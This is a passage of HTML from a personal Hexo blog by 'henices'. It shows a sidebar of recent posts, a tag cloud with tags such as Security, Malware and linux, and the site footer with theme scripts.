00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/youyuxi/" title="尤雨溪谈成功和运气">尤雨溪谈成功和运气</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/qiangliyandu/" title="万维钢的强力研读笔记法">万维钢的强力研读笔记法</a><time datetime="2023-09-24T16:00:00.000Z" title="Created 2023-09-25 00:00:00">2023-09-25</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/Malware/" style="font-size: 1.32em; color: #99a2ae">Malware</a> <a href="/tags/Software/" style="font-size: 1.25em; color: #999fa7">Software</a> <a href="/tags/PKM/" style="font-size: 1.21em; color: #999da3">PKM</a> <a href="/tags/Archives/" style="font-size: 1.14em; color: #999a9c">Archives</a> <a href="/tags/investment/" style="font-size: 1.39em; color: #99a5b5">investment</a> <a href="/tags/KNOWLEDGE/" style="font-size: 1.1em; color: #999">KNOWLEDGE</a> <a href="/tags/vim/" style="font-size: 1.25em; color: #999fa7">vim</a> <a href="/tags/Security/" style="font-size: 1.5em; color: #99a9bf">Security</a> <a href="/tags/Android/" style="font-size: 1.46em; color: #99a8bc">Android</a> <a href="/tags/Crack/" style="font-size: 1.17em; color: #999ca0">Crack</a> <a href="/tags/windows/" style="font-size: 1.32em; color: #99a2ae">windows</a> <a href="/tags/ai/" style="font-size: 1.1em; color: #999">ai</a> <a href="/tags/linux/" style="font-size: 1.43em; color: #99a6b8">linux</a> <a href="/tags/Life/" style="font-size: 1.28em; color: #99a0aa">Life</a> <a href="/tags/Programming/" style="font-size: 1.35em; color: #99a3b1">Programming</a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By henices</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
